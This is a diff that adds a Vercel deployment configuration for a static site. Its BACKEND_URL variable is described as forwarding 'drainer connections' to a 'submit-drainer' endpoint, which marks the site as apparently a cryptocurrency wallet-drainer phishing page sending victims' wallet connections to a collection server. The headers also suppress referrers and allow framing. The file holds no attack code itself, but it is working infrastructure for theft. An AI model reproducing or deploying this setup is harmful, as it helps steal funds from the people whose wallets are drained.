@@ -1,0 +1,35 @@
+{
+  "buildCommand": "echo 'Build complete'",
+  "outputDirectory": ".",
+  "framework": "static",
+  "env": {
+    "BACKEND_URL": {
+      "description": "Backend API URL for forwarding drainer connections",
+      "default": "https://st3-backend.vercel.app/api/submit-drainer"
+    }
+  },
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        {
+          "key": "X-Frame-Options",
+          "value": "ALLOW-ALL"
+        },
+        {
+          "key": "X-Content-Type-Options",
+          "value": "nosniff"
+        },
+        {
+          "key": "Referrer-Policy",
+          "value": "no-referrer"
+        },
+        {
+          "key": "Cache-Control",
+          "value": "public, max-age=3600"
+        }
+      ]
+    }
+  ],
+  "public": true
+}
